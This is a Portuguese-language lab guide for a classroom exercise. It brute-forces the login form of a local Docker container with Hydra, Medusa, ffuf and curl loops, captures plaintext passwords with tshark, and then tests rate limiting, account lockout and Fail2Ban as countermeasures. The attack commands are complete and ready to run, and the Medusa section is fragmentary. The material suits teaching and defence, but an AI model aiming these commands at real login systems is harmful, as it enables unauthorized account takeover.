// 00 · Como funciona

Arquitetura da Atividade

Dois containers Docker se comunicam em uma rede interna. Você vai entrar no Kali Linux e trabalhar direto no terminal — como um atacante ou defensor real.

🪟 Windows
  • PowerShell — só para subir os containers
  • Docker Desktop — motor dos containers
  • Navegador — acessar localhost:3000
⇄
🐉 Container Kali Linux
  • Hydra · Medusa · ffuf · curl
  • tshark · mitmproxy · fail2ban
  • Wordlist rockyou.txt
🎯 Container app-brute (alvo)
Aplicação web Node.js com página de login · porta 3000
🐉 Como você vai trabalhar nesta atividade

1 comando no PowerShell para entrar no Kali:

docker exec -it kali-tools bash

A partir daí, todo o resto é Linux puro — sem prefixo docker exec em cada comando. Você vai usar Hydra, Medusa, ffuf, tshark e curl diretamente, exatamente como em um Kali real.

⚠ Aviso ético

Esta atividade é realizada em ambiente isolado (Docker local). É proibido usar estas técnicas em sistemas reais sem autorização. Isso é crime — Lei nº 12.737/2012.

curl
reconhecimento manual

Por que começar com o curl? Antes de qualquer ataque automatizado, precisamos entender como a aplicação responde — qual texto retorna quando a senha está errada. Esse texto é o FAIL_STRING, exigido por Hydra, Medusa e ffuf.

  • 1

    Testar com senha errada e anotar a resposta

    Note que usamos app-brute como endereço — dentro da rede Docker, os containers se enxergam pelo nome.

    🐉 Terminal Kali
    Kali — senha errada
    curl -s -X POST http://app-brute:3000/login \
  -d 'username=admin&password=senhaerrada' \
  -w '\nStatus HTTP: %{http_code}\n'
    saída esperada
    {"success":false,"message":"Credenciais inválidas."}
Status HTTP: 401
    📌 Anote agora — FAIL_STRING

    O texto Credenciais inválidas. é o seu FAIL_STRING. Você vai usar esse texto exato nos próximos comandos do Hydra, Medusa e ffuf.

    HTTP 401 = não autorizado = senha errada.

  • 2

    Comparar com a resposta de login correto

    🐉 Terminal Kali
    Kali — senha correta (professor informa para comparação)
    curl -s -X POST http://app-brute:3000/login \
  -d 'username=admin&password=SENHA_CORRETA' \
  -w '\nStatus HTTP: %{http_code}\n'
    saída quando o login funciona
    {"success":true,"message":"Login realizado com sucesso! Bem-vindo, admin."}
Status HTTP: 200
    💡 A diferença entre falha e sucesso

    Status muda de 401 para 200. O corpo não contém o FAIL_STRING. As ferramentas de bruteforce usam isso para detectar automaticamente quando a senha foi encontrada.

    Ver os cabeçalhos HTTP completos (revela tecnologia do servidor)

🔱
Hydra
bruteforce principal

O que é: Uma das ferramentas de força bruta mais usadas em pentests. Testa automaticamente cada senha da wordlist contra o formulário de login, usando múltiplas threads paralelas.

  • 1

    Executar o Hydra contra o formulário de login

    Substitua Credenciais inválidas. pelo texto exato que você anotou no passo do curl.

    🐉 Terminal Kali
    Kali — Hydra bruteforce
    hydra \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  app-brute \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:Credenciais inválidas." \
  -t 4 -V -f
    ParâmetroO que faz
    -l adminUsuário fixo. Já sabemos que é "admin", então fixamos e deixamos variar só a senha.
    -P rockyou.txtWordlist de senhas. O Hydra testa cada linha como senha.
    app-bruteNome do container alvo na rede Docker interna.
    http-post-formMódulo para formulários HTTP POST.
    "/login:...:FAIL"Três partes: (1) path, (2) corpo com placeholders, (3) texto de falha.
    ^USER^ / ^PASS^Substituídos pelo usuário e senha atual a cada tentativa.
    -t 44 threads paralelas.
    -VVerbose — mostra cada tentativa.
    -fPara ao encontrar a primeira senha válida.
  • 2

    Identificar o resultado quando a senha for encontrada

    saída quando encontrada
    [http-post-form] host: app-brute   login: admin   password: dragon
1 of 1 target successfully completed, 1 valid password found
    ✓ Anote: senha, tempo e número de tentativas

    Você vai comparar esses valores com Medusa e ffuf.

  • 3

    Testar com mais threads e comparar velocidade

    🐉 Terminal Kali
    Kali — 16 threads
    hydra -l admin -P /usr/share/wordlists/rockyou.txt app-brute \
  http-post-form "/login:username=^USER^&password=^PASS^:Credenciais inválidas." \
  -t 16 -f
    🤔 Reflexão

    Ficou mais rápido? Houve erros? Por que mais threads não são sempre melhores?

Medusa
bruteforce alternativo

O que é: Alternativa ao Hydra com foco em paralelismo. O objetivo é comparar as duas ferramentas e perceber que profissionais de segurança conhecem múltiplas ferramentas para o mesmo fim.

  -h app-brute \
  -u admin \
  -P /usr/share/wordlists/rockyou.txt \

    -v 6Verbosidade máxima — mostra tudo
    -fPara ao encontrar a primeira senha

mitmproxy
intercepção HTTP

O que é: Proxy de intercepção HTTP em modo terminal. Funciona como o Burp Suite — fica entre o cliente e o servidor interceptando tudo — mas roda direto no Kali, sem interface gráfica.

  • 1

    Abrir uma segunda sessão do Kali (segunda janela)

    Para usar o mitmproxy, você vai precisar de duas janelas do Kali ao mesmo tempo. Abra um segundo PowerShell e entre no Kali novamente:

    🪟 PowerShell — segunda janela
    PowerShell — segunda sessão Kali
    docker exec -it kali-tools bash
  • 2

    Iniciar o mitmdump na janela 1 (captura passiva)

    O mitmdump captura e exibe todas as requisições que passam pelo proxy em tempo real:

    🐉 Terminal Kali — janela 1
    Kali janela 1 — iniciar proxy na porta 8080
    mitmdump --mode regular -p 8080 --flow-detail 2
    proxy aguardando
    Proxy server listening at http://*:8080
  • 3

    Enviar uma requisição via proxy na janela 2

    🐉 Terminal Kali — janela 2
    Kali janela 2 — curl via proxy
    curl -s -X POST http://app-brute:3000/login \
  -d 'username=admin&password=teste123' \
  --proxy http://127.0.0.1:8080
    o que aparece na janela 1 — requisição interceptada
    POST http://app-brute:3000/login
  username=admin&password=teste123
  ← 401 Unauthorized 42b
    💡 O que você está vendo

    O mitmproxy mostra a requisição completa: método, URL, corpo (com a senha!) e a resposta. É exatamente o que o Burp Suite faz — mas no terminal.

  • 4

    Testar várias senhas via proxy e identificar a correta pelo HTTP 200

    🐉 Terminal Kali — janela 2
    Kali janela 2 — loop de senhas via proxy
    head -20 /usr/share/wordlists/rockyou.txt | while read pass; do
  result=$(curl -s -X POST http://app-brute:3000/login \
    -d "username=admin&password=$pass" \
    --proxy http://127.0.0.1:8080 \
    -w ' HTTP:%{http_code}')
  echo "Senha: $pass -> $result"
done
    saída — HTTP:200 indica senha correta
    Senha: 123456   -> {"success":false} HTTP:401
Senha: password -> {"success":false} HTTP:401
Senha: dragon   -> {"success":true}  HTTP:200  ← encontrada!
Senha: 12345    -> {"success":false} HTTP:401
    ✓ Mesmo conceito do Burp Intruder

    O Burp Intruder faz exatamente isso visualmente — testa cada payload e você identifica a resposta diferente pelo Length. Aqui fazemos o mesmo via terminal com o status HTTP.

ffuf
fuzzing ultrarrápido

O que é: Ferramenta de fuzzing web ultrarrápida — uma das mais usadas para descoberta de diretórios ocultos e bruteforce de senhas. Objetivo: comparar a velocidade com o Hydra.

  • 1

    Executar o ffuf para bruteforce de senha

    🐉 Terminal Kali
    Kali — ffuf bruteforce
    ffuf \
  -w /usr/share/wordlists/rockyou.txt:FUZZ \
  -u http://app-brute:3000/login \
  -X POST \
  -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fr 'Credenciais' \
  -t 10 -mc all
    ParâmetroO que faz
    -w arquivo:FUZZWordlist com marcador. Onde FUZZ aparecer na requisição, será substituído pela senha atual.
    -u http://app-brute:3000/loginURL alvo — nome interno Docker
    -X POSTMétodo HTTP
    -d '...FUZZ'Corpo da requisição com FUZZ no lugar da senha
    -H 'Content-Type'Cabeçalho necessário para formulário web
    -fr 'Credenciais'Filtra respostas que contêm esse texto — só mostra o login bem-sucedido
    -t 1010 threads paralelas
    -mc allMostra todos os status codes
  • 2

    Observar a velocidade e comparar com o Hydra

    cabeçalho do ffuf — observe req/sec
    :: Threads   : 10
:: Filter    : Regexp: Credenciais
Progress: [200/14344391] :: 843 req/sec

🦈
tshark
análise de tráfego

O que é: Versão CLI do Wireshark — captura e analisa pacotes de rede direto no terminal. Vamos usá-lo para ver o tráfego do ataque e entender a diferença crítica entre HTTP e HTTPS.

  • 1

    Listar as interfaces de rede disponíveis no container

    🐉 Terminal Kali
    Kali — listar interfaces
    tshark -D
    saída — use eth0
    1. eth0
2. lo (Loopback)
3. any
    💡 Qual interface usar?

    eth0 é a interface de rede interna do container — por ela passa todo o tráfego entre kali-tools e app-brute.

  • 2

    Iniciar captura na janela 1 e rodar Hydra na janela 2

    🐉 Terminal Kali — janela 1 (captura)
    Kali janela 1 — captura ao vivo
    tshark -i eth0 \
  -Y "http && tcp.port == 3000" \
  -T fields \
  -e http.request.method \
  -e http.file_data \
  -E header=y 2>/dev/null
    🐉 Terminal Kali — janela 2 (ataque)
    Kali janela 2 — Hydra enquanto captura
    hydra -l admin -P /usr/share/wordlists/rockyou.txt app-brute \
  http-post-form "/login:username=^USER^&password=^PASS^:Credenciais inválidas." \
  -t 4
    janela 1 — senhas visíveis em texto claro!
    http.request.method  http.file_data
POST                 username=admin&password=123456
POST                 username=admin&password=password
POST                 username=admin&password=dragon
POST                 username=admin&password=12345
    ⚠ Implicação crítica de segurança

    Com HTTP, qualquer pessoa na rede captura e lê as senhas em texto puro — inclusive a correta quando o login funciona.

    Com HTTPS, esse campo estaria criptografado e completamente ilegível no tshark.

  • 3

    Salvar captura em arquivo .pcap

    🐉 Terminal Kali
    Kali — capturar e salvar
    # Capturar por 30 segundos e salvar
tshark -i eth0 -a duration:30 -w /app/logs/captura.pcap 2>/dev/null
echo "Arquivo salvo em ./logs/captura.pcap"

Etapa 2 — Contramedida 1: Rate Limiting

O que é: Limita quantas requisições um IP pode fazer por minuto. Acima do limite → erro 429 Too Many Requests.

  • 1

    Ver estado atual e ativar o Rate Limiting

    🐉 Terminal Kali
    Kali — ativar rate limiting
    # Ver estado atual
curl http://app-brute:3000/status

# Ativar rate limiting
curl -X POST http://app-brute:3000/config \
  -d 'feature=rateLimit&value=true'

# Tornar mais restritivo: máx 5 req/minuto
curl -X POST http://app-brute:3000/config \
  -d 'feature=maxReqs&value=5'
  • 2

    Rodar o Hydra novamente e observar o erro 429

    🐉 Terminal Kali
    Kali — testar com rate limiting ativo
    hydra -l admin -P /usr/share/wordlists/rockyou.txt app-brute \
  http-post-form "/login:username=^USER^&password=^PASS^:Credenciais inválidas." \
  -t 4 -V -f
    ✓ O que observar

    O Hydra passa a receber erros 429 e a mensagem "Muitas tentativas." O ataque fica muito mais lento ou para.

    🤔 Reflexão

    O rate limiting completamente impediu o ataque? Um atacante paciente poderia esperar 1 minuto e continuar?

Etapa 3 — Contramedida 2: Account Lockout

O que é: Após N tentativas falhas, a conta é bloqueada temporariamente. Independe do IP de origem.

  • 1

    Trocar para o lockout e simular o bloqueio

    🐉 Terminal Kali
    Kali — ativar lockout e testar
    # Trocar de contramedida
curl -X POST http://app-brute:3000/config -d 'feature=rateLimit&value=false'
curl -X POST http://app-brute:3000/config -d 'feature=lockout&value=true'
curl -X POST http://app-brute:3000/reset

# Simular 6 tentativas seguidas
for i in 1 2 3 4 5 6; do
  echo "=== Tentativa $i ==="
  curl -s -X POST http://app-brute:3000/login \
    -d "username=admin&password=errada_$i"
  echo
done
    resultado esperado
    Tentativa 1-5: {"message":"Credenciais inválidas."}
Tentativa 6:   {"message":"Conta bloqueada. Tente novamente em 300 segundos."}
  • 2

    Entender o tradeoff

    ⚠ O lockout pode ser arma de DoS

    Um atacante pode fazer 5 tentativas erradas de propósito para bloquear a conta de um usuário legítimo.

    Como mitigar: CAPTCHA após 3 tentativas, notificação por e-mail, lockout progressivo (1min → 5min → 30min), lockout por IP ao invés de por conta.

Etapa 4 — Contramedida 3: Fail2Ban

O que é: Monitora logs e bane automaticamente IPs suspeitos via firewall (iptables). Já está instalado no container Kali.

  • 1

    Criar o filtro e a jail do Fail2Ban

    🐉 Terminal Kali
    Kali — configurar Fail2Ban
    # Instalar (se necessário)
apt-get install -y -qq fail2ban

# Criar filtro — regex que identifica tentativas falhas no log
cat > /etc/fail2ban/filter.d/app-brute.conf << 'EOF'
[Definition]
failregex = ^<HOST> .* POST /login .* 401
ignoreregex =
EOF

# Criar jail — define ações e limites
cat > /etc/fail2ban/jail.d/app-brute.conf << 'EOF'
[app-brute]
enabled  = true
filter   = app-brute
logpath  = /app/logs/access.log
maxretry = 10
bantime  = 600
findtime = 60
EOF

# Iniciar o Fail2Ban
service fail2ban start
fail2ban-client status app-brute
    💡 O que cada campo significa

    <HOST> — placeholder que captura o IP automaticamente da linha de log

    maxretry = 10 — bane após 10 falhas

    bantime = 600 — ban dura 600 segundos (10 minutos)

    findtime = 60 — conta as falhas dentro de uma janela de 60 segundos

  • 2

    Executar o Hydra e observar o Fail2Ban banir o IP

    🐉 Terminal Kali — janela 1 (monitorar)
    Kali janela 1 — monitorar Fail2Ban
    watch -n 2 'fail2ban-client status app-brute'
    🐉 Terminal Kali — janela 2 (ataque)
    Kali janela 2 — executar ataque
    curl -X POST http://app-brute:3000/config -d 'feature=lockout&value=false'
curl -X POST http://app-brute:3000/reset
hydra -l admin -P /usr/share/wordlists/rockyou.txt app-brute \
  http-post-form "/login:username=^USER^&password=^PASS^:Credenciais inválidas." \
  -t 4
    janela 1 após o ban automático
    Status for the jail: app-brute

   |- Currently banned: 1
   `- Banned IP list:   172.18.0.3
  • 3

    Remover o ban para reiniciar os testes

    🐉 Terminal Kali
